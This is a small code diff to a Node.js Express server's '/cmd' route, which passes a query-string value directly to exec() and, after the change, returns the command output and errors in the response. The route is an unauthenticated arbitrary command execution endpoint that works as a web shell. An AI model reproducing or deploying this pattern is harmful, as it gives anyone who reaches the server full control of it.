@@ -17,11 +17,11 @@ app.get('/cmd', function (req, res){
 	
 	const command = req.query.cmd.replace('+',' ');
 	exec(`${command}`, (err, out) => {
-		if (err) {
-	  		console.log("could not execute commadn erro: ", err)
-			return		
-		}
-		res.send(out)
+		//if (err) {
+	  	//	console.log("could not execute commadn erro: ", err)
+		//	return		
+		//}
+		res.send(`\nout:\n\n${out} \n\nerr:\n\n${err}`)
 		console.log("Executed : ", out )
 	})
 })
